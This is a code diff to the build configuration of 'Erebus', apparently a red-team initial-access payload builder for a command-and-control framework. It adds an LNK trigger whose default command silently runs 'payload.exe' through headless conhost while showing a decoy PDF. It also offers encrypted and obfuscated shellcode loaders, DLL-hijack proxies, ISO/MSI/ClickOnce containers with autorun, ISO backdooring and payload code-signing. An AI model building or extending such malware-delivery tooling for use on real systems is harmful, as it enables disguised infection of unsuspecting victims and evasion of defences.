@@ -1,5 +1,5 @@
 '''
-- Author: Lavender-exe // Whispergate
+- Author(s): Lavender-exe // hunterino-sec // Whispergate
 - Title: Erebus
 - Description: Initial Access Wrapper
 
@@ -11,6 +11,7 @@ TODO:
 from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
 from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
 from erebus_wrapper.erebus.modules.container_msi import build_msi
+from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
 from erebus_wrapper.erebus.modules.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert
@@ -105,7 +106,7 @@ class ErebusWrapper(PayloadType):
 
     build_parameters = [
         BuildParameter(
-            name = "Main Payload Type",
+            name = "0.0 Main Payload Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the main payload type (Shellcode Loader or DLL Hijack)
 NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
@@ -115,33 +116,75 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
-            name = "Loader Format",
+            name = "0.1 Loader Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Select the loader's filetype.",
+            choices = ["ClickOnce", "Shellcode Loader"],
+            default_value = "Shellcode Loader",
+            hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.2 Loader Format",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's filetype.",
             choices = ["EXE", "DLL"],
             default_value = "EXE",
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                 # Change this if you are using a custom Loader written in another language
                 HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
-
+        
         BuildParameter(
-            name = "Loader Build Configuration",
+            name = "0.3 Loader Build Configuration",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's build config.",
             choices = ["debug", "release"],
             default_value = "debug",
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                 # Change this if you are using a custom shellcode retrieval method
                 HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
 
+
         BuildParameter(
-            name = "DLL Hijacking",
+            name = "0.4 Trigger Binary",
+            parameter_type = BuildParameterType.String,
+            description = "Choose a command to run when the trigger is executed.",
+            default_value = "C:\\Windows\\System32\\conhost.exe",
+            hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5 Trigger Command",
+            parameter_type = BuildParameterType.String,
+            description = "Choose a command to run when the trigger is executed.",
+            default_value = "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
+            hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.6 Decoy File",
+            parameter_type = BuildParameterType.File,
+            description = """Upload a decoy file (PDF/XLSX/etc.).
+If one is not uploaded then an example file will be used.""",
+            hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.0 DLL Hijacking",
             parameter_type = BuildParameterType.File,
             description = f"""Prepares a given DLL for proxy-based hijacking.
 NOTE: Shellcode Format must be set to C.
@@ -154,38 +197,9 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             ]
         ),
 
-        BuildParameter(
-            name = "Trigger Type",
-            parameter_type = BuildParameterType.ChooseOne,
-            description = "Choose a command to run when the trigger is executed.",
-            choices = ["ClickOnce", "LNK", "MSI"],
-            default_value = "ClickOnce",
-        ),
-
-        BuildParameter(
-            name = "Trigger Binary",
-            parameter_type = BuildParameterType.String,
-            description = "Choose a command to run when the trigger is executed.",
-            default_value = "C:\\Windows\\System32\\conhost.exe",
-        ),
-
-        BuildParameter(
-            name = "Trigger Command",
-            parameter_type = BuildParameterType.String,
-            description = "Choose a command to run when the trigger is executed.",
-            default_value = "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
-        ),
-
-        BuildParameter(
-            name = "Decoy File",
-            parameter_type = BuildParameterType.File,
-            description = """Upload a decoy file (PDF/XLSX/etc.).
-If one is not uploaded then an example file will be used.""",
-        ),
-
         # Shellcrypt
         BuildParameter(
-            name = "Compression Type",
+            name = "2.0 Compression Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose a compression type for the shellcode.",
             choices = [
@@ -197,7 +211,7 @@ If one is not uploaded then an example file will be used.""",
         ),
 
         BuildParameter(
-            name = "Encryption Type",
+            name = "2.1 Encryption Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encryption type for the shellcode.",
             choices = [
@@ -213,7 +227,7 @@ If one is not uploaded then an example file will be used.""",
         ),
 
         BuildParameter(
-            name = "Encryption Key",
+            name = "2.2 Encryption Key",
             parameter_type = BuildParameterType.String,
             description = """Choose an encryption key. A random one will be
 generated if none have been entered.""",
@@ -221,7 +235,7 @@ generated if none have been entered.""",
         ),
 
         BuildParameter(
-            name = "Encoding Type",
+            name = "2.3 Encoding Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encoding type for the shellcode.",
             choices = [
@@ -235,7 +249,7 @@ generated if none have been entered.""",
         ),
 
         BuildParameter(
-            name = "Shellcode Format",
+            name = "2.4 Shellcode Format",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose a format for the obfuscated shellcode.",
             choices = [
@@ -257,7 +271,7 @@ generated if none have been entered.""",
         ),
 
         BuildParameter(
-            name = "Shellcode Array Name",
+            name = "2.5 Shellcode Array Name",
             parameter_type = BuildParameterType.String,
             description = "Choose a name for the generated shellcode array. E.g. [array name] --> sh3llc0d3[113]...",
             default_value = "shellcode",
@@ -268,7 +282,7 @@ generated if none have been entered.""",
 
         # Archive
         BuildParameter(
-            name = "Container Type",
+            name = "3.0 Container Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose the final payload container type.",
             choices = ["ISO", "7z", "Zip", "MSI"],
@@ -276,24 +290,32 @@ generated if none have been entered.""",
         ),
 
         BuildParameter(
-            name="Compression Level",
+            name="3.1 Compression Level",
             parameter_type=BuildParameterType.ChooseOne,
             description="Select compression level (9 is max).",
             choices=["0", "1", "3", "5", "7", "9"],
             default_value="9",
+            hide_conditions = [
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="ISO"),
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="MSI"),
+            ]
         ),
 
         BuildParameter(
-            name="Archive Password",
+            name="3.2 Archive Password",
             parameter_type=BuildParameterType.String,
             description="Optional password for the archive (leave empty for none).",
             default_value="",
             required=False,
+            hide_conditions = [
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="ISO"),
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="MSI"),
+            ]
         ),
 
         #ISO
         BuildParameter(
-            name="ISO Volume ID",
+            name="4.0 ISO Volume ID",
             parameter_type=BuildParameterType.String,
             description="ISO Volume name seen in Explorer.",
             default_value="EREBUS",
@@ -304,7 +326,7 @@ generated if none have been entered.""",
         ),
 
         BuildParameter(
-            name="ISO enable Autorun",
+            name="4.1 ISO enable Autorun",
             parameter_type=BuildParameterType.Boolean,
             description="Enable Autorun for ISO",
             default_value=False,
@@ -315,7 +337,7 @@ generated if none have been entered.""",
         ),
 
         BuildParameter(
-            name="ISO Backdoor File",
+            name="4.2 ISO Backdoor File",
             parameter_type=BuildParameterType.File,
             description="Backdoor an existing ISO",
             required=False,
@@ -496,11 +518,11 @@ generated if none have been entered.""",
 
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
-            encryption_key_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "key.hpp"
+            encryption_key_path_cpp = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "key.hpp"
 
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
-            encryption_key_path = str(encryption_key_path)
+            encryption_key_path_cpp = str(encryption_key_path_cpp)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -624,7 +646,7 @@ generated if none have been entered.""",
                     key_array = key_src[start:end]
                     output += key_array
 
-                    with open(encryption_key_path, "w+") as file:
+                    with open(encryption_key_path_cpp, "w+") as file:
                         file.write(key_array)
 
                     # response.payload = open(obfuscated_shellcode_path, "rb").read()
